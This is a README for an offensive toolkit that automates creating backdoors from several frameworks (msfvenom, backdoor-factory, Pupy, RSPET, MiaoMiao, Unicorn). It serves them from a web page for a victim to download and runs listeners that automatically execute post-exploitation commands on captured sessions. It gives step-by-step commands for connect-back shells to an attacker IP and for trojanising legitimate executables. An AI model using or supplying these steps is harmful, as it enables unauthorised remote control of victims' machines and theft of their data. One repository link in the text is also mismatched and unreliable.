# KAOSK-Backdoors
==========
It's a tool that automate: 
+ the installation of some Backdoor's creation programs
+ the creation of the backdoors to use in a victim machine
+ a web where you can download the backdoors created
+ the listener of the backdoors downloaded
+ the actions of the listener

## Example
Using Kali2 as the attacker with IP: 192.168.0.100

Using any machine as the victim in the same network as the attacker.

Run in Kali:
+ git clone https://github.com/carlospolop/KAOSK-backdoors.git
+ python ./install.py
+ python ./create_backdoors.py 192.168.0.100
+ python ./handler.py 192.168.0.100

In the victim machine:
Use a browser and navigate to 192.168.0.100/back and you will see the backdoors created before in the attacker
Download the backdoor that you want to use
Run the backdoor

You will have a session in the victim's machine.

If you have chose a backdoor created with msfvenom, backdoor-factory or unicorn, you will have a metasploit session in the victim. The metasploit's sessions can be configured to run post modules, meterpreter commands and shell commands in the config folder. This means that when you capture a metasploit sessions this modules and commands will run automatically.

## How to configure which post modules, meterpreter commands and shell commands to use
You just have to go to the config folder and the you will find some folders of differents OS. Go inside anyone and you will find some text documents where you can write which post modules, meterpreters commands and shell comands to use when you capture a session in a machine that uses the OS selected.

## Install
python ./install.py

## Create Backdoors
python ./create_backdoors.py <IP_attacker>

## Start handler
python ./handler.py <IP_attacker>


# To Know about the backdoors
--------------------
## Backdoors used:
+ Backdoor-factoy
+ MiaoMiao
+ Msfvenom
+ Pupy
+ RSPET
+ Unicorn

## Backdoor-factory
The backdoor-factory introduce the backdoor inside executables.
If you want to corrupt a executable, you just have to download the original, move it to the correct folder inside BDF_prepared and run python ./create_backdoors.py <IP_attacker> (or python ./backdoor-factoryAuto.py <IP_attacker>)

https://github.com/secretsquirrel/the-backdoor-factory.git

## MiaoMiao
This backdoor open a port in the victims machine and the attacker connects to it. The default port is 55555
To use this backdoor you have to run:
+ Victim: Run src_backdoor > server_dist > newest_version
+ Attacker: nc IP_Victim 55555 -vv

https://github.com/marc0l92/MiaoMiao_project.git

## Msfvenom
Of course.

## Pupy
Creates differents types of backdoors and use it's own listener. It is all automated and the process followed to use these backdoors is:
+ Victim: Run the file create using ./pupygen.py -f lin_x64  connect --host IP_Attacker
+ Attacker: ./pupysh.py

https://github.com/n1nj4sec/pupy.git

## RSPET
To use this backdoor you have to run:
+ Victim: Run python RSPET_folder/Client/rspet_client.py <IP_Attacker>
+ Attacker: (This part is automated) Run Server > rspet_server.py 

https://github.com/panagiks/RSPET.git

## Unicorn
Creates differents types of backdoors and it is all automated.
Use metasploit as listener.

https://github.com/n1nj4sec/pupy.git
